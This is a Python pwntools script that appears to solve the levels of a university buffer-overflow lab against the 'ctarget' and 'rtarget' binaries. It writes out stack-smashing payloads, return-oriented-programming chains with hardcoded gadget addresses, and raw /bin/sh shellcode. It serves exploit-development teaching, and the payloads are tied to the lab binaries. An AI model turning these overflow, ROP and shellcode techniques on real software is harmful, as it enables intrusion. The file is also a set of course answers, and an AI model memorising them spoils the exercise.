import os
from typing import Callable

import click
from pwn import process, p64, gdb, asm, context

from Crypto.Util.number import long_to_bytes

DIRECTORY = './answers/'
BUF_SIZE = 56
COOKIE = int(open('cookie.txt', 'r').read(), 16)
POPRDIRET = asm('pop rdi; ret', arch='amd64')

def check_level(level: int) -> bool: return level in [1, 2, 3, 4, 5, 6]

def get_solution_func(level: int) -> Callable[[bool], None]:
    match level:
        case 1:
            return solve_level_1
        case 2:
            return solve_level_2
        case 3:
            return solve_level_3
        case 4:
            return solve_level_4
        case 5:
            return solve_level_5
        case 6:
            return binsh
        case _:
            raise ValueError("Invalid level")
        
def print_solution(level: int, solution: bytes) -> None:
    if not os.path.exists(DIRECTORY):
        os.makedirs(DIRECTORY)
    
    path = os.path.join(DIRECTORY, f'level_{level}_solution')
    with open(path, 'wb') as f:
        f.write(solution)

def solve_ctarget(solution: bytes, flag: bool, level: int) -> None:
    if flag:
        print_solution(level, solution)
        return
    
    proc = process(['./ctarget', '-q'])
    proc.sendline(solution)
    proc.interactive()

def solve_rtarget(solution: bytes, flag: bool, level: int) -> None:
    if flag:
        print_solution(level, solution)
        return
    
    proc = process(['./rtarget', '-q'])
    proc.sendline(solution)
    proc.interactive()
        
def solve_level_1(flag: bool) -> None:
    solution = (
        b"a" * BUF_SIZE # padding
        + p64(0x4017fc) # touch 1
    )
    solve_ctarget(solution, flag, 1)

def binsh(flag: bool) -> None:
    binsh_shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    solution = (
        binsh_shellcode
        + b"a" * (BUF_SIZE - len(binsh_shellcode)) # padding
        + p64(0x5561e608) # cookie hex value address
    )
    
    proc = process(['./ctarget', '-q'])
    gdb.attach(proc)
    proc.sendline(solution)
    proc.interactive()

def solve_level_2(flag: bool) -> None:
    solution = (
        b"a" * BUF_SIZE # padding
        + p64(0x4028f0) # pop rdi; ret
        + p64(COOKIE) # cookie value
        + p64(0x401828) # touch 2
    )
    solve_ctarget(solution, flag, 2)

def solve_level_3(flag: bool) -> None:
    payload = long_to_bytes(COOKIE).hex().encode() + b'\x00'
    solution = (
        payload
        + POPRDIRET
        + b"a" * (BUF_SIZE - len(payload) - len(POPRDIRET)) # padding
        + p64(0x5561e608 + len(payload)) # pop rdi; ret
        + p64(0x5561e608) # cookie hex value address
        + p64(0x4018fc) # touch 3
    )
    solve_ctarget(solution, flag, 3)

def solve_level_4(flag: bool) -> None:
    solution = (
        b"a" * BUF_SIZE # padding
        + p64(0x4019a8) # pop rax; ret
        + p64(COOKIE) # cookie value
        + p64(0x401992) # mov rdi, rax; ret
        + p64(0x401828) # touch 2
    )
    solve_rtarget(solution, flag, 4)

def solve_level_5(flag: bool) -> None:
    payload = long_to_bytes(COOKIE).hex().encode() + b'\x00'
    solution = (
        b"a" * BUF_SIZE # padding
        + p64(0x401a70) # mov rax, rsp; ret
        + p64(0x401992) # mov rdi, rax; ret
        + p64(0x4019a8) # pop rax; ret
        + p64(0x100) # offset to cookie
        + p64(0x401a5d) # mov edx, eax; nop; ret
        + p64(0x4019cd) # mov ecx, edx; and bl, bl; ret
        + p64(0x401a49) # mov esi, ecx; or dl, dl; ret
        + p64(0x4019c6) # lea rax, [rdi + rsi]; ret
        + p64(0x401992) # mov rdi, rax; ret
        + p64(0x4018FC) # touch 3
        + b"a" * (0x100 - 0x40 - 8) # padding (offset - prev_stack_size - self)
        + payload # cookie hex string
    )
    solve_rtarget(solution, flag, 5)

@click.command()
@click.option("--level", "-l", help="level to solve", required=True, type=int)
@click.option("--output", "-o", is_flag=True, help="print the solution instead of executing it", type=bool, default=False)
def main(level: int, output: bool):
    if not check_level(level):
        click.echo(f"Invalid level: {level}")
        return

    binary_path = get_solution_func(level)
    binary_path(output)

if __name__ == "__main__":
    main()